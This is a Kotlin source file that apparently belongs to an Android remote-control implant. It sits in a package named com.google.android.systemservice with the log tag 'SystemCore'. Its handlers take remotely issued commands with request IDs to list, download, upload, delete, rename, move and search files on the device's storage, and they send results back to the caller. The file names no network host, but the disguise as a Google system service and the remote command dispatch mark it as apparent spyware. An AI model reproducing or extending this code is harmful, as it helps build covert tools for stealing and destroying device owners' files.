package com.google.android.systemservice.handlers

import android.content.Intent
import com.google.android.systemservice.services.FileBrowserService
import org.json.JSONObject

class FileHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    private fun delegateToFileBrowser(command: String, params: JSONObject) {
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", command)
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeBrowseFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        delegateToFileBrowser("list_files", JSONObject().apply {
            put("path", path)
            put("recursive", params?.optBoolean("recursive", false) ?: false)
        })
        ctx.sendResponse("file_browser", JSONObject().apply {
            put("status", "listing")
            put("path", path)
        })
    }

    fun executeListFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val recursive = params?.optBoolean("recursive", false) ?: false
        delegateToFileBrowser("list_files", JSONObject().apply {
            put("path", path)
            put("recursive", recursive)
        })
    }

    fun executeDownloadFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        delegateToFileBrowser("download_file", JSONObject().apply {
            put("path", path)
        })
    }

    fun executeUploadFile(params: JSONObject?) {
        params ?: return
        delegateToFileBrowser("upload_file", params)
    }

    fun executeUploadFileChunk(params: JSONObject?) {
        params ?: return
        delegateToFileBrowser("upload_file_chunk", params)
    }

    fun executeDeleteFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        delegateToFileBrowser("delete_file", JSONObject().apply {
            put("path", path)
        })
    }

    fun executePreviewFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        delegateToFileBrowser("preview_file", JSONObject().apply {
            put("path", path)
            put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
        })
    }

    fun executeRenameFile(params: JSONObject?) {
        params ?: return
        delegateToFileBrowser("rename_file", params)
    }

    fun executeMoveFile(params: JSONObject?) {
        params ?: return
        delegateToFileBrowser("move_file", params)
    }

    fun executeSearchFiles(params: JSONObject?) {
        params ?: return
        delegateToFileBrowser("search_files", params)
    }
}
